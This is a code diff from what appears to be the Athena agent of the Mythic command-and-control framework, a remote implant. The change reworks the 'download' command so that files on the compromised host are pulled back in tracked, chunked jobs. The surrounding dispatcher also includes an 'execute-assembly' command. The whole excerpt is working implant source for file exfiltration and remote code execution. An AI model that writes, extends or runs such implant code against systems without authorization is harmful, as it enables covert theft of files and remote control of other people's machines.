@@ -26,10 +26,27 @@ namespace Athena.Commands
             {
                 case "download":
                     Task.Run(() => {
-                        MythicDownloadJob j = new MythicDownloadJob(job);
-                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                        j.path = par["file"];
-                        FileHandler.downloadFile(j);
+                        if (!Globals.downloadJobs.ContainsKey(job.task.id))
+                        {
+                            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
+                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
+                            downloadJob.path = par["file"];
+                            downloadJob.total_chunks = downloadJob.GetTotalChunks();
+                            Globals.downloadJobs.Add(job.task.id, downloadJob);
+
+                            if (downloadJob.total_chunks == 0)
+                            {
+                                job.errored = true;
+                                job.taskresult = "An error occurred while attempting to access the file.";
+                                job.hasoutput = true;
+                                job.complete = true;
+                            }
+
+                            //Download response ready to return
+                            job.started = true;
+                            job.taskresult = "";
+                            job.hasoutput = true;
+                        }
                     });
                     break;
                 case "execute-assembly":
